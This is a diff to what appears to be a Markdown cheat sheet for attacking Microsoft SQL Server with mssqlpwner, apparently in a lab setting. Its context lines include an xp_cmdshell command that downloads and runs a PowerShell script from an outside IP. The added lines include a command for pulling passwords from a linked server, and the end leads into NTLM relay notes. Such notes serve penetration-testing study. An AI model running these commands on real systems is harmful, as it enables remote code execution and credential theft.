@@ -198,9 +198,11 @@ Get interactive prompt:
 Execute xp_cmdshell (automation is done by the tool, it will try every variation to get it done):
 - `exec -command_execution_method (xp_cmdshell/sp_oacreate) "powershell iex(iwr http://192.168.45.196/hollow.ps1 -useb)"`
 
-Executing custom assembly:
+Execute command through custom assembly:
 - `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname`
 
+Retrieving password from the linked server:
+- `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password`
 
 ## NTLM Relay:
 *Note: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket*
